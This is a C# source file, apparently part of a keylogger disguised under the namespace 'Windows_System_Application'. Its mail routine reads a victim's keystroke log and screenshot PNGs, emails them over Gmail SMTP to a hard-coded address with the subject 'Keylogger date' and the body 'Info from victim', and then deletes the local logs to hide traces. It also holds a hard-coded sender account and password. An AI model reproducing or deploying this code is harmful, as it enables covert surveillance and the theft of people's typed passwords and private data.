using System;
using System.IO;
using System.Net.Mail;

namespace Windows_System_Application.source
{
    internal class Mail
    {

        #region Mail
        public static int mailTime = 5000; //5 sec
        public static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("wwwwww3q@gmail.com");
                mail.To.Add("phatdatfbi@gmail.com");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";

                string directoryy = $"{ConfigLogFile.rootLogSave}\\{DateTime.Now.ToLongDateString()}\\";
                string logFile = directoryy + ConfigLogFile.logName + ConfigLogFile.logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = $"{directoryy}Image\\";

                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("wwwwww3q@gmail.com", "jzlnmqvjgaximfkt");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                if (Directory.Exists(ConfigLogFile.rootLogSave))
                {
                    Directory.Delete(ConfigLogFile.rootLogSave, true);
                }

                // phải làm cái này ở mail dùng để gửi phải bật lên
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion
    }
}
